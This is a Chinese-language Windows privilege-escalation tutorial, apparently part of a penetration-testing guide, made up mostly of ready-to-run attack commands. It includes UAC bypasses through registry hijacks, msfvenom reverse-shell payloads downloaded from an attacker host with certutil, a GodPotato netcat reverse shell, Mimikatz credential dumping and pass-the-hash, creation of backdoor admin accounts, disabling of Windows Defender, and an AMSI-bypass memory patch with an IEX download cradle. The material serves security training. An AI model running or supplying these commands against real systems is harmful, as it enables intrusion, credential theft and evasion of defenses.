```


---

## 9. UAC 绕过

### 9.1 UAC 基础

```
┌─────────────────────────────────────────────────────────────────────┐
│ UAC (User Account Control) 概述                                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ UAC 级别:                                                            │
│ • 始终通知 (最高)                                                   │
│ • 仅当程序尝试更改时通知 (默认)                                     │
│ • 仅当程序尝试更改时通知（不降低桌面亮度）                          │
│ • 从不通知 (最低/禁用)                                              │
│                                                                      │
│ 完整性级别:                                                          │
│ • High (高) - 管理员进程                                            │
│ • Medium (中) - 标准用户进程                                        │
│ • Low (低) - 受限进程                                               │
│                                                                      │
│ UAC 绕过条件:                                                        │
│ • 当前用户是管理员组成员                                            │
│ • 进程以中等完整性运行                                              │
│ • 目标是提升到高完整性                                              │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

```powershell
# 检查 UAC 状态
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# ConsentPromptBehaviorAdmin 值:
# 0 = 不提示，直接提升
# 1 = 提示凭证
# 2 = 提示同意
# 3 = 提示凭证（安全桌面）
# 4 = 提示同意（安全桌面）
# 5 = 默认，非 Windows 二进制文件提示同意

# 检查当前完整性级别
whoami /groups | findstr "Mandatory"
# Medium Mandatory Level = 中等完整性
# High Mandatory Level = 高完整性
```

### 9.2 常见 UAC 绕过方法

```powershell
# 方法 1: Fodhelper.exe (Windows 10)
# 利用 fodhelper.exe 的自动提升特性

# 设置注册表
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f

# 执行 fodhelper
fodhelper.exe

# 清理
reg delete "HKCU\Software\Classes\ms-settings" /f

# 方法 2: ComputerDefaults.exe
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\temp\malicious.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f
ComputerDefaults.exe

# 方法 3: Eventvwr.exe (Windows 7-10)
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe

# 方法 4: sdclt.exe (Windows 10)
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v DelegateExecute /t REG_SZ /f
sdclt.exe

# 方法 5: SilentCleanup (Windows 10)
reg add "HKCU\Environment" /v windir /d "cmd.exe /c C:\temp\malicious.exe &" /f
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
reg delete "HKCU\Environment" /v windir /f
```

### 9.3 使用 UACME

```powershell
# UACME 是一个 UAC 绕过工具集
# https://github.com/hfiref0x/UACME

# 使用方法
Akagi64.exe <method_number> <command>

# 示例
Akagi64.exe 23 cmd.exe
Akagi64.exe 61 C:\temp\malicious.exe

# 常用方法编号 (Windows 10/11):
# 23 - fodhelper
# 33 - sdclt
# 41 - cmstp
# 61 - wsreset
# 62 - slui

# 查看所有方法
# 参考 UACME 的 README
```

### 9.4 PowerShell UAC 绕过

```powershell
# Invoke-PsUACme
Import-Module .\Invoke-PsUACme.ps1
Invoke-PsUACme -Verbose

# 指定方法
Invoke-PsUACme -method oobe

# 执行命令
Invoke-PsUACme -Payload "cmd.exe /c net user hacker Password123! /add"

# Bypass-UAC
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

### 9.5 Metasploit UAC 绕过

```bash
# 在 Meterpreter 中
getsystem  # 首先尝试直接提权

# 如果失败，使用 UAC 绕过模块
background
use exploit/windows/local/bypassuac
set SESSION 1
exploit

# 其他 UAC 绕过模块
use exploit/windows/local/bypassuac_fodhelper
use exploit/windows/local/bypassuac_eventvwr
use exploit/windows/local/bypassuac_sdclt
use exploit/windows/local/bypassuac_silentcleanup

# 成功后再次尝试
getsystem
```

---

## 10. 自动化工具

### 10.1 WinPEAS

WinPEAS 是最全面的 Windows 提权枚举工具。

```powershell
# 下载
# https://github.com/carlospolop/PEASS-ng/releases

# 基本使用
.\winPEASany.exe

# 指定检查类型
.\winPEASany.exe quiet                    # 只显示重要信息
.\winPEASany.exe systeminfo userinfo      # 特定检查
.\winPEASany.exe servicesinfo             # 服务信息
.\winPEASany.exe applicationsinfo         # 应用程序信息

# 输出到文件
.\winPEASany.exe > winpeas_output.txt

# 颜色输出
.\winPEASany.exe log=winpeas.txt

# 检查类型:
# systeminfo - 系统信息
# userinfo - 用户信息
# processinfo - 进程信息
# servicesinfo - 服务信息
# applicationsinfo - 应用程序
# networkinfo - 网络信息
# windowscreds - Windows 凭证
# browserinfo - 浏览器信息
# filesinfo - 文件信息
# eventsinfo - 事件日志
```

### 10.2 PowerUp

```powershell
# 下载
# https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

# 导入模块
Import-Module .\PowerUp.ps1
. .\PowerUp.ps1

# 运行所有检查
Invoke-AllChecks

# 特定检查
Get-ServiceUnquoted                    # 未加引号的服务路径
Get-ModifiableServiceFile              # 可修改的服务文件
Get-ModifiableService                  # 可修改的服务
Get-ServiceDetail                      # 服务详情
Get-UnattendedInstallFile              # 无人值守安装文件
Get-Webconfig                          # Web 配置文件
Get-ApplicationHost                    # IIS 配置
Get-SiteListPassword                   # McAfee 密码
Get-CachedGPPPassword                  # GPP 缓存密码
Get-RegistryAutoLogon                  # 自动登录凭证
Get-ModifiableRegistryAutoRun          # 可修改的自启动项
Get-ModifiableScheduledTaskFile        # 可修改的计划任务
Get-UnattendedInstallFile              # 无人值守安装文件

# 利用函数
Write-ServiceBinary                    # 写入服务二进制
Install-ServiceBinary                  # 安装服务二进制
Restore-ServiceBinary                  # 恢复服务二进制
Write-HijackDll                        # 写入劫持 DLL
Write-UserAddMSI                       # 创建添加用户的 MSI
Invoke-ServiceAbuse                    # 滥用服务
```

### 10.3 Seatbelt

```powershell
# Seatbelt 是一个 C# 安全审计工具
# https://github.com/GhostPack/Seatbelt

# 运行所有检查
.\Seatbelt.exe -group=all

# 特定组
.\Seatbelt.exe -group=user             # 用户相关
.\Seatbelt.exe -group=system           # 系统相关
.\Seatbelt.exe -group=slack            # Slack 相关
.\Seatbelt.exe -group=chrome           # Chrome 相关
.\Seatbelt.exe -group=remote           # 远程相关

# 特定检查
.\Seatbelt.exe TokenPrivileges         # 令牌权限
.\Seatbelt.exe UACSystemPolicies       # UAC 策略
.\Seatbelt.exe Services                # 服务
.\Seatbelt.exe ScheduledTasks          # 计划任务
.\Seatbelt.exe CredentialGuard         # 凭证保护

# 输出到文件
.\Seatbelt.exe -group=all -outputfile="seatbelt.txt"
```

### 10.4 Watson

```powershell
# Watson 检查缺失的补丁
# https://github.com/rasta-mouse/Watson

.\Watson.exe

# 输出示例:
# [*] OS Build Number: 17763
# [*] Enumerating installed KBs...
# [!] CVE-2019-0836 : VULNERABLE
# [!] CVE-2019-1064 : VULNERABLE
```

### 10.5 BeRoot

```powershell
# BeRoot 是一个提权检查工具
# https://github.com/AlessandroZ/BeRoot

.\beRoot.exe

# 检查内容:
# - 服务配置错误
# - 计划任务
# - 启动项
# - 注册表权限
# - 文件权限
```

### 10.6 PrivescCheck

```powershell
# PrivescCheck 是一个 PowerShell 提权检查脚本
# https://github.com/itm4n/PrivescCheck

# 导入并运行
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck

# 扩展检查
Invoke-PrivescCheck -Extended

# 输出到文件
Invoke-PrivescCheck -Report PrivescCheck_Report -Format HTML
```

---

## 11. 实战案例

### 11.1 案例一：服务路径提权

```powershell
# 场景: 发现未加引号的服务路径

# 1. 信息收集
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# 发现:
# VulnService  Vulnerable Service  C:\Program Files\Vuln App\service.exe  Auto

# 2. 检查权限
icacls "C:\Program Files"
# 发现 Users 有写权限

# 3. 生成 Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > Program.exe

# 4. 传输到目标
certutil -urlcache -f http://10.10.10.10:8080/Program.exe "C:\Program.exe"

# 5. 设置监听
# 攻击机
nc -lvnp 4444

# 6. 重启服务
sc stop VulnService
sc start VulnService

# 7. 获得 SYSTEM Shell
```

### 11.2 案例二：AlwaysInstallElevated 提权

```powershell
# 场景: 发现 AlwaysInstallElevated 已启用

# 1. 检查
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 返回 0x1

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 返回 0x1

# 2. 生成恶意 MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi > evil.msi

# 3. 传输到目标
certutil -urlcache -f http://10.10.10.10:8080/evil.msi C:\temp\evil.msi

# 4. 设置监听
nc -lvnp 4444

# 5. 安装 MSI
msiexec /quiet /qn /i C:\temp\evil.msi

# 6. 获得 SYSTEM Shell
```

### 11.3 案例三：Potato 提权

```powershell
# 场景: 获得了 IIS 服务账户的 Shell，有 SeImpersonatePrivilege

# 1. 检查权限
whoami /priv
# SeImpersonatePrivilege  Enabled

# 2. 下载 GodPotato
certutil -urlcache -f http://10.10.10.10:8080/GodPotato.exe C:\temp\GodPotato.exe

# 3. 执行提权
.\GodPotato.exe -cmd "cmd /c whoami"
# 输出: nt authority\system

# 4. 添加管理员用户
.\GodPotato.exe -cmd "cmd /c net user hacker Password123! /add"
.\GodPotato.exe -cmd "cmd /c net localgroup administrators hacker /add"

# 5. 或者反弹 Shell
.\GodPotato.exe -cmd "cmd /c C:\temp\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

### 11.4 案例四：凭证窃取提权

```powershell
# 场景: 获得了管理员 Shell，需要获取域管理员凭证

# 1. 上传 Mimikatz
certutil -urlcache -f http://10.10.10.10:8080/mimikatz.exe C:\temp\mimikatz.exe

# 2. 提取凭证
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 发现域管理员凭证:
# Username: DomainAdmin
# NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# 3. Pass-the-Hash
.\mimikatz.exe "sekurlsa::pth /user:DomainAdmin /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe" "exit"

# 4. 或使用 Impacket
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/DomainAdmin@dc01.corp.local
```

### 11.5 案例五：内核漏洞提权

```powershell
# 场景: Windows Server 2019，未打补丁

# 1. 收集系统信息
systeminfo > systeminfo.txt

# 2. 在攻击机上分析
python wes.py systeminfo.txt

# 发现: CVE-2021-1732 可利用

# 3. 下载 Exploit
# https://github.com/KaLendsi/CVE-2021-1732-Exploit

# 4. 编译或使用预编译版本
# 传输到目标
certutil -urlcache -f http://10.10.10.10:8080/CVE-2021-1732.exe C:\temp\exploit.exe

# 5. 执行
.\exploit.exe
# 获得 SYSTEM Shell
```


---

## 12. 常见错误与解决

### 12.1 权限相关错误

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误: Access is denied                                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因:                                                                │
│ 1. 当前用户权限不足                                                  │
│ 2. 文件/目录 ACL 限制                                               │
│ 3. UAC 阻止                                                         │
│                                                                      │
│ 解决方案:                                                            │
│ # 检查当前权限                                                       │
│ whoami /priv                                                         │
│ whoami /groups                                                       │
│                                                                      │
│ # 检查文件权限                                                       │
│ icacls "C:\path\to\file"                                            │
│                                                                      │
│ # 尝试其他提权方法                                                   │
│ # 如果是 UAC 问题，尝试 UAC 绕过                                    │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误: SeImpersonatePrivilege 不可用                                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因:                                                                │
│ 当前用户没有模拟权限，Potato 攻击无法使用                           │
│                                                                      │
│ 解决方案:                                                            │
│ # 检查当前权限                                                       │
│ whoami /priv                                                         │
│                                                                      │
│ # 如果没有 SeImpersonatePrivilege:                                  │
│ # 1. 尝试其他提权方法（服务、注册表等）                             │
│ # 2. 寻找有此权限的进程并迁移                                       │
│ # 3. 尝试内核漏洞                                                   │
│                                                                      │
│ # 通常有此权限的账户:                                                │
│ # - IIS 应用池账户                                                  │
│ # - SQL Server 服务账户                                             │
│ # - 其他服务账户                                                    │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 12.2 工具相关错误

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误: Mimikatz - ERROR kuhl_m_sekurlsa_acquireLSA                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因:                                                                │
│ 1. 没有 SeDebugPrivilege                                            │
│ 2. 不是管理员权限                                                   │
│ 3. Credential Guard 启用                                            │
│                                                                      │
│ 解决方案:                                                            │
│ # 确保以管理员运行                                                   │
│ # 检查 Credential Guard                                             │
│ reg query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags│
│                                                                      │
│ # 如果 Credential Guard 启用:                                       │
│ # - 尝试 LSASS 转储方法                                             │
│ # - 使用 DCSync（如果有域管理员权限）                               │
│ # - 尝试其他凭证获取方法                                            │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误: Exploit 执行失败 / 系统崩溃                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因:                                                                │
│ 1. 系统版本不匹配                                                   │
│ 2. 补丁已安装                                                       │
│ 3. Exploit 不稳定                                                   │
│                                                                      │
│ 解决方案:                                                            │
│ # 1. 确认系统版本                                                    │
│ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"                │
│                                                                      │
│ # 2. 检查补丁                                                        │
│ wmic qfe list full | findstr "KB编号"                               │
│                                                                      │
│ # 3. 使用正确版本的 Exploit                                         │
│ # 4. 在测试环境先验证                                               │
│ # 5. 尝试其他提权方法                                               │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 12.3 防护绕过

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误: Windows Defender 检测到恶意软件                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 解决方案:                                                            │
│ # 1. 检查 Defender 状态                                             │
│ Get-MpComputerStatus                                                │
│                                                                      │
│ # 2. 添加排除路径（需要管理员）                                     │
│ Add-MpPreference -ExclusionPath "C:\temp"                           │
│                                                                      │
│ # 3. 禁用实时保护（需要管理员）                                     │
│ Set-MpPreference -DisableRealtimeMonitoring $true                   │
│                                                                      │
│ # 4. 使用混淆/加密的 Payload                                        │
│ # 5. 使用 AMSI 绕过                                                 │
│ # 6. 使用 Living-off-the-Land 技术                                  │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

```powershell
# AMSI 绕过示例
# 方法 1: 内存补丁
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# 方法 2: 使用 PowerShell 降级
powershell -version 2 -command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"

# 方法 3: 使用编码
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
powershell -EncodedCommand $encoded
```

### 12.4 网络相关错误

```
┌─────────────────────────────────────────────────────────────────────┐
│ 错误: 无法下载文件 / 网络连接失败                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 原因:                                                                │
│ 1. 防火墙阻止                                                       │
│ 2. 代理设置                                                         │
│ 3. 网络隔离                                                         │
│                                                                      │
│ 解决方案:                                                            │
│ # 检查防火墙                                                         │
│ netsh advfirewall show allprofiles                                  │
│                                                                      │
│ # 检查代理                                                           │
│ netsh winhttp show proxy                                            │
│                                                                      │
│ # 使用不同的下载方法                                                 │
│ # certutil                                                          │
│ certutil -urlcache -f http://attacker/file.exe file.exe             │
│                                                                      │
│ # PowerShell                                                        │
│ (New-Object Net.WebClient).DownloadFile('http://attacker/file.exe','file.exe')│
│                                                                      │
│ # bitsadmin                                                         │
│ bitsadmin /transfer job /download /priority high http://attacker/file.exe C:\temp\file.exe│
│                                                                      │
│ # 如果出站被阻止，考虑:                                             │
│ # - 使用 DNS 隧道                                                   │
│ # - 使用 ICMP 隧道                                                  │
│ # - 使用允许的端口 (80, 443)                                        │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 12.5 常见错误速查表

| 错误 | 可能原因 | 解决方案 |
|------|---------|---------|
| Access is denied | 权限不足 | 检查 ACL，尝试其他方法 |
| The system cannot find the file | 路径错误 | 检查路径，使用绝对路径 |
| This program is blocked | AppLocker/WDAC | 使用白名单程序，绕过技术 |
| Exploit failed | 版本不匹配 | 确认系统版本和补丁 |
| Token manipulation failed | 权限不足 | 需要 SeImpersonatePrivilege |
| Service did not start | 服务配置错误 | 检查服务配置和依赖 |
| UAC prompt appeared | UAC 未绕过 | 使用 UAC 绕过技术 |
| Defender blocked | 被检测 | 混淆、AMSI 绕过 |
| Connection refused | 防火墙/服务未运行 | 检查防火墙和服务状态 |
| Hash not found | 凭证保护 | 尝试其他凭证获取方法 |

### 12.6 调试技巧

```powershell
# 1. 详细错误信息
$ErrorActionPreference = "Continue"
$VerbosePreference = "Continue"

# 2. 检查最后一个错误
$Error[0] | Format-List -Force

# 3. 测试命令
# 在执行危险操作前，先测试
whoami
# 确认当前上下文

# 4. 使用 -WhatIf 参数
Remove-Item C:\important -WhatIf

# 5. 日志记录
Start-Transcript -Path C:\temp\log.txt
# ... 执行命令 ...
Stop-Transcript

# 6. 进程监控
# 使用 Process Monitor 监控文件和注册表操作

# 7. 网络监控
# 使用 Wireshark 或 netsh trace
netsh trace start capture=yes tracefile=C:\temp\trace.etl
# ... 执行操作 ...
netsh trace stop
```

---

## 总结

Windows 提权是渗透测试中的关键技能，需要掌握多种方法和工具。

**核心知识点**：

1. **信息收集**
   - 系统信息、补丁、服务、进程
   - 敏感文件和凭证
   - 网络配置

2. **提权方法**
   - 内核漏洞（Potato 系列、PrintNightmare）
   - 服务配置错误（未加引号路径、权限错误）
   - 注册表提权（AlwaysInstallElevated）
   - 计划任务和启动项
   - 令牌操作
   - 凭证窃取（Mimikatz）
   - UAC 绕过

3. **自动化工具**
   - WinPEAS - 全面枚举
   - PowerUp - PowerShell 提权
   - Seatbelt - 安全审计
   - Watson - 补丁检查

4. **实战技巧**
   - 先枚举，后利用
   - 优先使用配置错误，再考虑内核漏洞
   - 注意清理痕迹
   - 准备多种方法

**学习建议**：
1. 搭建实验环境练习
2. 使用 HackTheBox、TryHackMe 等平台
3. 关注最新漏洞和技术
4. 理解原理，不只是使用工具

---

> 📚 参考资料
> - [PayloadsAllTheThings - Windows Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
> - [HackTricks - Windows Privesc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
> - [LOLBAS Project](https://lolbas-project.github.io/)
> - [GTFOBins](https://gtfobins.github.io/)
> - [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)
